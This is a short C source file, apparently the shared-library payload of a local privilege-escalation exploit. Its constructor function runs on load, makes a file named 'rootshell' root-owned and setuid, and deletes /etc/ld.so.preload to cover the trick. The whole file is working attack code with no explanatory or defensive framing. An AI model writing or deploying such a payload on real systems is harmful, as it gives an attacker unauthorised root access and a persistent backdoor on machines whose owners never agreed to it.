#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("rootshell", 0, 0);
    chmod("rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
